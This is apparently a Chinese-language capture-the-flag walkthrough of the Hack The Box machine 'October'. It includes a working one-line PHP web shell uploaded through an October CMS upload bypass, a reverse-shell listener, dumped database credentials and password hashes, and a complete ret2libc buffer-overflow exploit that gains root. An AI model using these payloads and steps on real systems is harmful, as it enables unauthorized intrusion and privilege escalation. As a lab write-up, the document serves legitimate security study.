# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 探测

开放端口
```
┌──(root㉿ss)-[~]
└─# nmap -p- --open --min-rate=1000 10.10.10.16 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 09:16 EDT
Nmap scan report for 10.10.10.16
Host is up (0.0038s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 101.26 seconds

```

详细端口信息
```
┌──(root㉿ss)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.16 -p 22,80    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 09:18 EDT
Nmap scan report for 10.10.10.16
Host is up (0.0046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: October CMS - Vanilla
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   5.55 ms 10.10.14.1
2   5.56 ms 10.10.10.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds

```


# web

这个靶机非常的卡，目录爆破根本不可能，就算延时只有2,3ms的vps上爆破也会卡半天，那我就当这也是个考验吧。。。

谷歌搜索 october是一个cms，后台登陆入口是:
```
http://10.10.10.16/backend/backend/auth/signin
```

使用默认密码：```admin:admin```可以登录

kali搜索漏洞情况

```
┌──(root💀kali)-[~/htb/October]
└─# searchsploit october                         
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit)                                                         | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities                                                                             | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting                                                                               | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)                                                        | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting                                                            | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                                                                      | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                                                                | php/webapps/43106.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

使用41936里的 PHP upload protection bypass

准备一个php文件，取名sh.php5
```
<?php $_REQUEST['x']($_REQUEST['c']);
```

在后台media->upload 上传上面的文件

访问以下url触发payload

```
http://10.10.10.16/storage/app/media/sh.php5?x=system&c=pwd
```

现在我们有了一个简易的web shell，需要升级为交互式shell

上传一个完整的rev shell

```
10.10.10.16/storage/app/media/shell.php5
```


拿到foothold
```
┌──(root💀kali)-[~/htb/October]
└─# nc -lnvp 80                 
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.16] 44406
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux
 18:11:54 up  2:01,  0 users,  load average: 0.00, 0.00, 1.40
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$    
```

user.txt

```
$ cat user.txt
f10eb78b5dcbacc6...
$ pwd
/home/harry

```


# 提权

传linpeas

找到数据库配置文件
```
-rw-rw-r-- 1 www-data www-data 3917 Apr 20  2017 /var/www/html/cms/config/database.php
            'database' => 'storage/database.sqlite',
            'host'      => 'localhost',
            'database'  => 'october',
            'password'  => 'OctoberCMSPassword!!',
            'host'     => 'localhost',
            'database' => 'database',
            'password' => '',
            'host'     => 'localhost',
            'database' => 'database',
            'password' => '',
            'host'     => '127.0.0.1',
            'password' => null,
            'database' => 0,
```


登录，找打harry的cms登录密码哈希
```
mysql> select * from backend_users;
select * from backend_users;
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
| id | first_name | last_name    | login | email             | password                                                     | activation_code | persist_code                                                 | reset_password_code | permissions | is_activated | activated_at | last_login          | created_at          | updated_at          | is_superuser |
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
|  1 | Harry      | Varthakouris | harry | harry@october.htb | $2y$10$4tBYxIpkBpR9.coxVUdeJetCp77EFLp1U2o/f2.wlKaBbe698aIzO | NULL            | NULL                                                         | NULL                |             |            1 | NULL         | 2017-04-20 21:05:21 | 2017-04-20 19:14:15 | 2017-04-20 21:06:28 |            1 |
|  2 | Admin      | Admin        | admin | admin@october.htb | $2y$10$ozRr2QHKXLJXx/n.rhQO6.2PxEeNXywYozigkq5NrH7TRBLzqrzUG | NULL            | $2y$10$SxQFwenHehdTACqlHbGRQ.DKBeg5a9K5BP8QkwB2MQ.XdWOxefBvW | NULL                |             |            0 | NULL         | 2022-05-25 15:00:16 | 2017-04-20 21:05:43 | 2022-05-25 15:00:16 |            0 |
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
2 rows in set (0.00 sec)

```


但是貌似爆破不出来


## buff

提权的这个bof非常有趣，跟我们平常做的不太一样，这里完成提权主要参考了0xdf的这个[wp](https://0xdf.gitlab.io/2019/03/26/htb-october.html)


发现一个奇怪的SUID

```
-rwsr-xr-x 1 root root 7.3K Apr 21  2017 /usr/local/bin/ovrflw (Unknown SUID binary)
```


尝试执行
```
$ /usr/local/bin/ovrflw
Syntax: /usr/local/bin/ovrflw <input string>
```

提示我们需要传入字符串

随意输入一串字符串
```
$ /usr/local/bin/ovrflw aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
$ 
```

没有任何返回

## fuzzing


生成一段不重复字节

```
──(root💀kali)-[~/htb/October]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

```


执行，提示溢出
```
$ /usr/local/bin/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
Segmentation fault (core dumped)

```


通过不断的折半fuzzing，在111个字符的时候刚刚好填满不会报错

```
/usr/local/bin/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6
```

## gdb调试本地bash程序

把ovrflw这个文件拷贝到kali本地

使用ldd命令查看程序依赖的共享库信息
```
┌──(root💀kali)-[~/htb/October]
└─# ldd ovrflw 
        linux-gate.so.1 (0xf7fae000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d9d000)
        /lib/ld-linux.so.2 (0xf7fb0000)

```


使用gdp开始调试,使用github上[这个脚本](https://github.com/longld/peda)，自动加载peda
```
┌──(root💀kali)-[~/htb/October]
└─# gdb -q ./ovrflw
Reading symbols from ./ovrflw...
(No debugging symbols found in ./ovrflw)
gdb-peda$  
```

从上面我们已经知道，程序在111个字节内不会报错

生成112个字节，并且在末尾加上"BBBB"4个字节


```
gdb-peda$ pattern_create 112
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAi'
```


运行它
```
gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiBBBB'
Starting program: /root/htb/October/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiBBBB'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd460 ("7AAMAAiBBBB")
EDX: 0xffffd175 ("7AAMAAiBBBB")
ESI: 0x2 
EDI: 0x8048380 (<_start>:       xor    ebp,ebp)
EBP: 0x6941414d ('MAAi')
ESP: 0xffffd180 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd180 --> 0x0 
0004| 0xffffd184 --> 0xffffd224 --> 0xffffd3de ("/root/htb/October/ovrflw")
0008| 0xffffd188 --> 0xffffd230 --> 0xffffd46c ("COLORFGBG=15;0")
0012| 0xffffd18c --> 0xffffd1b4 --> 0x0 
0016| 0xffffd190 --> 0xffffd1c4 --> 0xe89a30d9 
0020| 0xffffd194 --> 0xf7ffdb98 --> 0xf7ffdb30 --> 0xf7fc33f0 --> 0xf7ffd9d0 --> 0x0 
0024| 0xffffd198 --> 0xf7fc3420 --> 0x804828a ("GLIBC_2.0")
0028| 0xffffd19c --> 0xf7fa3000 --> 0x1ead6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()

```

观察EIP的值，此时已经被BBBB覆盖，也就是我们后面加入的4个字母的"BBBB"的ASCII码

这里跟我们之前打的bof就有点像了



查看程序共享库的地址，这里的地址是：0xb75f9000  （注意。这个值每次运行都不一样）
```
www-data@october:/$ ldd /usr/local/bin/ovrflw | grep libc
ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75f9000)

```

查看system, exit, 和 bin/sh 的偏移位
```
www-data@october:/$  readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
<f -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"         
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

www-data@october:/$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
< -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"                       
 162bac /bin/sh
 164b10 /bin/csh

```

现在计算上面每个命令的地址,16进制加法器看[这里](https://www.99cankao.com/digital-computation/hex-addition-calculator.php)

```
exit    ：0xb75f9000 + 00033260 = 0xB762C260

system  ：0xb75f9000 + 00040310 = 0xB7639310

/bin/sh : 0xb75f9000 + 162bac   = 0xB775BBAC
```


把上面计算出来的地址拼接到一起（注意地址要从后往前写）
```
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x93\x63\xb7"（system） + "\x60\xc2\x62\xb7"（exit） + "\xac\xbb\x75\xb7"（/bin/sh）');done
```

运行,一直到得到root为止
```
www-data@october:/$ while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x93\x63\xb7" + "\x60\xc2\x62\xb7" + "\xac\xbb\x75\xb7"');done
<7" + "\x60\xc2\x62\xb7" + "\xac\xbb\x75\xb7"');done                         
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
... 
...
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
8c8994098c143f...
# 

```